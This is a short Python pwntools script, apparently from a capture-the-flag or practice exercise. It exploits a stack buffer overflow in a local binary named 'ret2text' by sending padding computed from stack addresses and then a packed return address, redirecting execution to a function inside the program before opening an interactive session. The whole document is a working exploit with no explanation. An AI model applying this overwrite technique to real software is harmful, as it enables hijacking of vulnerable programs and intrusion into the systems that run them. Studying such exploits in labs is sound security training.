from pwn import*

target_addr = 0x804863A
eax_addr = 0xffffcf9c
ebp_addr = 0xffffd008

offset = ebp_addr - eax_addr

proc = process("./pwn/ret2text/ret2text")

proc.sendline(b'A' * (offset + 4) + p32(target_addr))

proc.interactive()
